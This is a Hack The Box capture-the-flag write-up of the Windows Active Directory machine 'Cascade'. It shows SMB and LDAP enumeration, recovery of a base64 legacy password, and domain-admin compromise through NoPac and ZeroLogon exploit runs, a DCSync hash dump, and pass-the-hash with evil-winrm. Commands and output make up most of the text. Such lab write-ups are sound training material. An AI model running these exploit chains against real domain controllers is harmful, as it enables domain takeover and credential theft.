---
title: Cascade
summary: Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), LDAP (389).
date: 2026-04-12
tags: [Hack The Box, Active Directory, Windows]
difficulty: medium
os: Windows
url: https://app.hackthebox.com/machines/Cascade
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/Cascade%20%5BAD%5D/Cascade%20%5BAD%5D.md
---

# Cascade
## Host file setup
```python
sudo nxc smb 10.129.18.9 --generate-hosts-file /etc/hosts  
[sudo] password for kali: 
SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
```
- SMB signing is enabled
- Null auth enabled

## Enumeration
### Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn casc-dc1.cascade.local
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 17:11 +0100
Nmap scan report for casc-dc1.cascade.local (10.129.18.9)
Host is up (0.013s latency).
rDNS record for 10.129.18.9: CASC-DC1.cascade.local
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49168/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.70 seconds
```

### Nmap
```python
nmap -p 53,88,135,139,389,445,636,3268,3269,5985 -A --min-rate=2000 -sT -Pn casc-dc1.cascade.local                      
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 17:13 +0100
Nmap scan report for casc-dc1.cascade.local (10.129.18.9)
Host is up (0.014s latency).
rDNS record for 10.129.18.9: CASC-DC1.cascade.local

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-12 16:13:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

## SMB (445)
### Null auth
#### Users
```python
nxc smb casc-dc1.cascade.local -u '' -p '' --users-export users.txt
SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\: 
SMB         10.129.18.9     445    CASC-DC1         -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.18.9     445    CASC-DC1         CascGuest                     <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.18.9     445    CASC-DC1         arksvc                        2020-01-09 16:18:20 0        
SMB         10.129.18.9     445    CASC-DC1         s.smith                       2020-01-28 19:58:05 0        
SMB         10.129.18.9     445    CASC-DC1         r.thompson                    2020-01-09 19:31:26 0        
SMB         10.129.18.9     445    CASC-DC1         util                          2020-01-13 02:07:11 0        
SMB         10.129.18.9     445    CASC-DC1         j.wakefield                   2020-01-09 20:34:44 0        
SMB         10.129.18.9     445    CASC-DC1         s.hickson                     2020-01-13 01:24:27 0        
SMB         10.129.18.9     445    CASC-DC1         j.goodhand                    2020-01-13 01:40:26 0        
SMB         10.129.18.9     445    CASC-DC1         a.turnbull                    2020-01-13 01:43:13 0        
SMB         10.129.18.9     445    CASC-DC1         e.crowe                       2020-01-13 03:45:02 0        
SMB         10.129.18.9     445    CASC-DC1         b.hanson                      2020-01-13 16:35:39 0        
SMB         10.129.18.9     445    CASC-DC1         d.burman                      2020-01-13 16:36:12 0        
SMB         10.129.18.9     445    CASC-DC1         BackupSvc                     2020-01-13 16:37:03 0        
SMB         10.129.18.9     445    CASC-DC1         j.allen                       2020-01-13 17:23:59 0        
SMB         10.129.18.9     445    CASC-DC1         i.croft                       2020-01-15 21:46:21 0        
SMB         10.129.18.9     445    CASC-DC1         [*] Enumerated 15 local users: CASCADE
SMB         10.129.18.9     445    CASC-DC1         [*] Writing 15 local users to users.txt
```

#### Shares
Cannot list shares using null authentication

#### Rid brute
```python
nxc smb casc-dc1.cascade.local -u '' -p '' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
```
Since rid brute tends to be more accurate i will run this as well and cut the output and replace the contents of the user file

This has given me three extra users!

The guest account is called `CascGuest` on this domain but this account is disabled so no help here

## LDAP (389)
```python
nxc ldap casc-dc1.cascade.local -u '' -p '' --query "(sAMAccountName=r.thompson)" ""   

LDAP        10.129.18.9     389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.18.9     389    CASC-DC1         [+] cascade.local\: 
LDAP        10.129.18.9     389    CASC-DC1         [+] Response for object: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
LDAP        10.129.18.9     389    CASC-DC1         objectClass          top
LDAP        10.129.18.9     389    CASC-DC1                              person
LDAP        10.129.18.9     389    CASC-DC1                              organizationalPerson
LDAP        10.129.18.9     389    CASC-DC1                              user
LDAP        10.129.18.9     389    CASC-DC1         cn                   Ryan Thompson
LDAP        10.129.18.9     389    CASC-DC1         sn                   Thompson
LDAP        10.129.18.9     389    CASC-DC1         givenName            Ryan
LDAP        10.129.18.9     389    CASC-DC1         distinguishedName    CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
LDAP        10.129.18.9     389    CASC-DC1         instanceType         4
LDAP        10.129.18.9     389    CASC-DC1         whenCreated          20200109193126.0Z
LDAP        10.129.18.9     389    CASC-DC1         whenChanged          20200323112031.0Z
LDAP        10.129.18.9     389    CASC-DC1         displayName          Ryan Thompson
LDAP        10.129.18.9     389    CASC-DC1         uSNCreated           24610
LDAP        10.129.18.9     389    CASC-DC1         memberOf             CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
LDAP        10.129.18.9     389    CASC-DC1         uSNChanged           295010
LDAP        10.129.18.9     389    CASC-DC1         name                 Ryan Thompson
LDAP        10.129.18.9     389    CASC-DC1         objectGUID           2dfa43ea-a9e0-524b-a913-2f5b1570418c
LDAP        10.129.18.9     389    CASC-DC1         userAccountControl   66048
LDAP        10.129.18.9     389    CASC-DC1         badPwdCount          36
LDAP        10.129.18.9     389    CASC-DC1         codePage             0
LDAP        10.129.18.9     389    CASC-DC1         countryCode          0
LDAP        10.129.18.9     389    CASC-DC1         badPasswordTime      134204850389451552
LDAP        10.129.18.9     389    CASC-DC1         lastLogoff           0
LDAP        10.129.18.9     389    CASC-DC1         lastLogon            132247339125713230
LDAP        10.129.18.9     389    CASC-DC1         pwdLastSet           132230718862636251
LDAP        10.129.18.9     389    CASC-DC1         primaryGroupID       513
LDAP        10.129.18.9     389    CASC-DC1         objectSid            S-1-5-21-3332504370-1206983947-1165150453-1109
LDAP        10.129.18.9     389    CASC-DC1         accountExpires       9223372036854775807
LDAP        10.129.18.9     389    CASC-DC1         logonCount           2
LDAP        10.129.18.9     389    CASC-DC1         sAMAccountName       r.thompson
LDAP        10.129.18.9     389    CASC-DC1         sAMAccountType       805306368
LDAP        10.129.18.9     389    CASC-DC1         userPrincipalName    r.thompson@cascade.local
LDAP        10.129.18.9     389    CASC-DC1         objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
LDAP        10.129.18.9     389    CASC-DC1         dSCorePropagationData 20200126183918.0Z
LDAP        10.129.18.9     389    CASC-DC1                              20200119174753.0Z
LDAP        10.129.18.9     389    CASC-DC1                              20200119174719.0Z
LDAP        10.129.18.9     389    CASC-DC1                              20200119174508.0Z
LDAP        10.129.18.9     389    CASC-DC1                              16010101000000.0Z
LDAP        10.129.18.9     389    CASC-DC1         lastLogonTimestamp   132294360317419816
LDAP        10.129.18.9     389    CASC-DC1         msDS-SupportedEncryptionTypes 0
LDAP        10.129.18.9     389    CASC-DC1         cascadeLegacyPwd     clk0bjVldmE=
```
After querying several different users on the domain i try this one and find credentials

```python
echo 'clk0bjVldmE=' | base64 -d                                                
rY4n5eva
```

```python
r.thompson:rY4n5eva
```
After base64 decoding it i get his password

```python
nxc smb casc-dc1.cascade.local -u 'r.thompson' -p 'rY4n5eva'       
SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
```
This user is compromised

## Domain admin (Unintendeds)
### NoPac
```python
nxc smb casc-dc1.cascade.local -u 'r.thompson' -p 'rY4n5eva' -M nopac               
SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
NOPAC       10.129.18.9     445    CASC-DC1         TGT with PAC size 1487
NOPAC       10.129.18.9     445    CASC-DC1         TGT without PAC size 722
NOPAC       10.129.18.9     445    CASC-DC1         
NOPAC       10.129.18.9     445    CASC-DC1         VULNERABLE
NOPAC       10.129.18.9     445    CASC-DC1         Next step: https://github.com/Ridter/noPac
```
It is vulnerable to NoPac i knew to test for this based on past experience with a similar version of windows

```python
python3 noPac.py cascade.local/r.thompson:'rY4n5eva' -dc-ip 10.129.18.9 -dc-host casc-dc1 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target CASC-DC1.cascade.local
[*] will try to impersonate administrator
[*] Adding Computer Account "WIN-RRNTVQP3YBF$"
[*] MachineAccount "WIN-RRNTVQP3YBF$" password = rOa2XRkHugC#
[*] Successfully added machine account WIN-RRNTVQP3YBF$ with password rOa2XRkHugC#.
[*] WIN-RRNTVQP3YBF$ object = CN=WIN-RRNTVQP3YBF,CN=Computers,DC=cascade,DC=local
[*] WIN-RRNTVQP3YBF$ sAMAccountName == CASC-DC1
[*] Saving a DC's ticket in CASC-DC1.ccache
[*] Reseting the machine account to WIN-RRNTVQP3YBF$
[*] Restored WIN-RRNTVQP3YBF$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving a user's ticket in administrator.ccache
[*] Rename ccache to administrator_CASC-DC1.cascade.local.ccache
[*] Attempting to del a computer with the name: WIN-RRNTVQP3YBF$
[-] Delete computer WIN-RRNTVQP3YBF$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
SeLockMemoryPrivilege           Lock pages in memory                      Enabled 
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeTcbPrivilege                  Act as part of the operating system       Enabled 
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Enabled 
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled 
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
SeCreatePermanentPrivilege      Create permanent shared objects           Enabled 
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeAuditPrivilege                Generate security audits                  Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled 
SeTimeZonePrivilege             Change the time zone                      Enabled 
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled 

C:\Windows\system32>
```
Domain admin!

### ZeroLogon
Past experience also tells me this version can be vulnerable to zerologon

```python
nxc smb casc-dc1.cascade.local -u 'r.thompson' -p 'rY4n5eva' -M zerologon
SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
ZEROLOGON   10.129.18.9     445    CASC-DC1         VULNERABLE
ZEROLOGON   10.129.18.9     445    CASC-DC1         Next step: https://github.com/dirkjanm/CVE-2020-1472
```
It is indeed vulnerable


```python
python3 cve-2020-1472-exploit.py casc-dc1 10.129.18.9 
Performing authentication attempts...
========================================================================================================================================================================================================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```
This set the DC machine account password to a blank string

Now i can do a DCSync

```python
impacket-secretsdump -just-dc -no-pass casc-dc1\$@10.129.18.9 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
cascade.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:7c2ea40b06d267f1557a09ac086b4487:::
cascade.local\CascGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3a1b37192392d74e86d04242288dc147:::
cascade.local\arksvc:1106:aad3b435b51404eeaad3b435b51404ee:10ffc991edaa4635cf81eb91762420cb:::
cascade.local\s.smith:1107:aad3b435b51404eeaad3b435b51404ee:b48b49789458698abadc119c8e310703:::
cascade.local\r.thompson:1109:aad3b435b51404eeaad3b435b51404ee:63251f7b1bada5082e5ffb18261ba28f:::
cascade.local\util:1111:aad3b435b51404eeaad3b435b51404ee:49a914ea7201025aeff21cd858ec7d66:::
cascade.local\j.wakefield:1116:aad3b435b51404eeaad3b435b51404ee:13ae5d7704258917054d662d016eab60:::
cascade.local\s.hickson:1121:aad3b435b51404eeaad3b435b51404ee:2776416ceb426c515cab11bb8411067b:::
cascade.local\j.goodhand:1122:aad3b435b51404eeaad3b435b51404ee:1d6eb7e45708504e0a9646b7aea9fc9b:::
cascade.local\a.turnbull:1124:aad3b435b51404eeaad3b435b51404ee:1d6eb7e45708504e0a9646b7aea9fc9b:::
cascade.local\e.crowe:1127:aad3b435b51404eeaad3b435b51404ee:95d4f729c16ae37b910317d665ba2215:::
cascade.local\b.hanson:1128:aad3b435b51404eeaad3b435b51404ee:5da61ebae419b915627f25f101fe6b1b:::
cascade.local\d.burman:1129:aad3b435b51404eeaad3b435b51404ee:5da61ebae419b915627f25f101fe6b1b:::
cascade.local\BackupSvc:1130:aad3b435b51404eeaad3b435b51404ee:c27e154566c4788326fce339f4b55491:::
cascade.local\j.allen:1134:aad3b435b51404eeaad3b435b51404ee:64928a685f9a995045f8c04bbf86881d:::
cascade.local\i.croft:1135:aad3b435b51404eeaad3b435b51404ee:431682a8242a237e805badacab95b0e4:::
CASC-DC1$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-RRNTVQP3YBF$:1139:aad3b435b51404eeaad3b435b51404ee:8d0289b6229a0659a6c90c96ee3846dc:::
[*] Kerberos keys grabbed
cascade.local\administrator:aes256-cts-hmac-sha1-96:201b2d849679d315b51959d1acd879032e1f6dba6fa9feb772a2d985edc2c2cf
cascade.local\administrator:aes128-cts-hmac-sha1-96:5ebdd49d14c5b62141ab0e6a2780ef70
cascade.local\administrator:des-cbc-md5:1532f8259b2c4f45
krbtgt:aes256-cts-hmac-sha1-96:25deaf37ed42e5cd95b76850d9d76fa663fcce3a9512f31357f5e45d333ca5ea
krbtgt:aes128-cts-hmac-sha1-96:22f5ccb8e68382406cb6e3c24c706208
krbtgt:des-cbc-md5:fba77f5b31239d9e
cascade.local\arksvc:aes256-cts-hmac-sha1-96:3717cd1cd9e13ac692bd99e0de0bbdd7910296f8d1f465cb559f76eb63f21bcc
cascade.local\arksvc:aes128-cts-hmac-sha1-96:0e34dc2f704261583d5f0bfbdf4cac14
cascade.local\arksvc:des-cbc-md5:73f2c423982534a8
cascade.local\s.smith:aes256-cts-hmac-sha1-96:c5b64b93302ccfb91648acea44a708797371bcec306a74a42d614365329635ce
cascade.local\s.smith:aes128-cts-hmac-sha1-96:4cc2dc914d7d971f3708dba510b1a1e9
cascade.local\s.smith:des-cbc-md5:6be0fdeab6cec762
cascade.local\r.thompson:aes256-cts-hmac-sha1-96:d5bf934e36dbbb73b35345f08117b844874b343c9149095ff86034172272259e
cascade.local\r.thompson:aes128-cts-hmac-sha1-96:def0284f32bcaa0291184f0e6b2a8af0
cascade.local\r.thompson:des-cbc-md5:89e3da3dc74576d9
cascade.local\util:aes256-cts-hmac-sha1-96:9e74ea4fa951ebe411bb9d734c48202fd346a21e414bc61c49ff14b41ba14bb5
cascade.local\util:aes128-cts-hmac-sha1-96:cadfed05f20d4ca27ffa30b30664dbae
cascade.local\util:des-cbc-md5:c4a8765b4f3db901
cascade.local\j.wakefield:aes256-cts-hmac-sha1-96:c3a6a1518a513ef2344859b204692d92adea4c78a6b8539e1743cfcbeb85dc5c
cascade.local\j.wakefield:aes128-cts-hmac-sha1-96:134734b88534d38ce5bd786bac268f07
cascade.local\j.wakefield:des-cbc-md5:a876678997570e6d
cascade.local\s.hickson:aes256-cts-hmac-sha1-96:ebdd5dd6e9d0dfac16983b005db8e84b482250740bc3e64b0e58ae30f7e7a7b5
cascade.local\s.hickson:aes128-cts-hmac-sha1-96:83b64186d9c5d8e74b44d6efa3b19ed7
cascade.local\s.hickson:des-cbc-md5:ce8c2f9dfe3b3ddf
cascade.local\j.goodhand:aes256-cts-hmac-sha1-96:770b3bd99ce9b17bbf3e35a839615eb1204cbae05990db83e9393a2564c2f8ed
cascade.local\j.goodhand:aes128-cts-hmac-sha1-96:11ccc9eea5401915a46406441e50ed8f
cascade.local\j.goodhand:des-cbc-md5:fb9226a16d94ba64
cascade.local\a.turnbull:aes256-cts-hmac-sha1-96:4adfe6a4be270895c5a55e440e2a14d70db45f4729d82caff0c157140729f3f1
cascade.local\a.turnbull:aes128-cts-hmac-sha1-96:89c3c86c69648eea1e589db7316710ae
cascade.local\a.turnbull:des-cbc-md5:2c076e23493ef7ba
cascade.local\e.crowe:aes256-cts-hmac-sha1-96:c6459e3f1647f02bd9528bca926beb8bfc944b42f3b12d9777fbdc59431fdc43
cascade.local\e.crowe:aes128-cts-hmac-sha1-96:6d36444d8f1b1a4bda6d7c4118ed61d9
cascade.local\e.crowe:des-cbc-md5:f445588fae23a729
cascade.local\b.hanson:aes256-cts-hmac-sha1-96:a6071c3a20a3ce2e373e8586ef7bd12cb665eb6ee66d110df57ee9f703b528f0
cascade.local\b.hanson:aes128-cts-hmac-sha1-96:34f9f21922871be23e9bedc3fc1741cd
cascade.local\b.hanson:des-cbc-md5:57ef54d568d03e86
cascade.local\d.burman:aes256-cts-hmac-sha1-96:b6a2a64a272ba6c7d2cf638b8614a370d597bc167222555ec655facca6ebfe08
cascade.local\d.burman:aes128-cts-hmac-sha1-96:310087249254f69e0436b2113f08909e
cascade.local\d.burman:des-cbc-md5:83313268372502c2
cascade.local\BackupSvc:aes256-cts-hmac-sha1-96:ffba7ff6b18eba90d46d787e56a0a0ebba7c8d933f992f2b896e5c7ec7da8720
cascade.local\BackupSvc:aes128-cts-hmac-sha1-96:854bd600cad9e7cd309eb124039b25a7
cascade.local\BackupSvc:des-cbc-md5:9ea4d0da8cdcbcef
cascade.local\j.allen:aes256-cts-hmac-sha1-96:56a9256363211ec2ac9ac5d64ddc931b10123bdf4ce4a90c4eee14aab91e401a
cascade.local\j.allen:aes128-cts-hmac-sha1-96:7f03f34bc8c2919a6b6ddd22c983d23c
cascade.local\j.allen:des-cbc-md5:a1b0c14f0ec715a8
cascade.local\i.croft:aes256-cts-hmac-sha1-96:a26cfa25eeb98248137d57f00a509aca41a091218b5a9971ca6af7cd0552c469
cascade.local\i.croft:aes128-cts-hmac-sha1-96:ac531c4553b8f5c2f62614d91e9864e5
cascade.local\i.croft:des-cbc-md5:b6f89862bf854cf1
CASC-DC1$:aes256-cts-hmac-sha1-96:512b1c0937d82f8226296d4ce7fd819dcb5f355edc5f107bacb873507fdbe518
CASC-DC1$:aes128-cts-hmac-sha1-96:93716a94d39656950840d265c55dd8b5
CASC-DC1$:des-cbc-md5:fd6b9b4ceaf2ef7c
WIN-RRNTVQP3YBF$:aes256-cts-hmac-sha1-96:a6da10f4e1d7aaa44720f3dc90e57244a5499672c3fd012caa91d66ef28718ca
WIN-RRNTVQP3YBF$:aes128-cts-hmac-sha1-96:74e529f46e3b81ca02b6aa5d4adb60c0
WIN-RRNTVQP3YBF$:des-cbc-md5:2640269491ce6e92
[*] Cleaning up...
```
I now have all the hashes

```python
evil-winrm -i casc-dc1.cascade.local -u administrator -H '7c2ea40b06d267f1557a09ac086b4487'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
Domain admin! AGAIN!
